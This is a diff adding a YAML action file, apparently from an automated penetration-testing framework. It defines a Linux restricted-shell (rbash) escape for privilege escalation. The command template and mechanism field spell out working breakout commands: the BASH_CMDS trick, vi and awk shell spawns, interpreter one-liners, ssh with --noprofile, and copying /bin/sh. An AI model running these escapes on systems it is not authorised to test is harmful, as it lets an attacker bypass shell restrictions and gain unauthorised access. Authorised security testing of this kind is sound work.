@@ -1,0 +1,16 @@
+name: rbash_escape
+category: privesc
+description: Restricted shell (rbash) escape
+preconditions:
+  - os==linux
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "BASH_CMDS[a]=/bin/sh;a"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "Escape rbash: vi/vim (:!/bin/sh), awk/nawk (awk 'BEGIN{system("/bin/sh")}'), python/perl/ruby one-liners, ssh -t 'bash --noprofile', cp /bin/sh to allowed path."
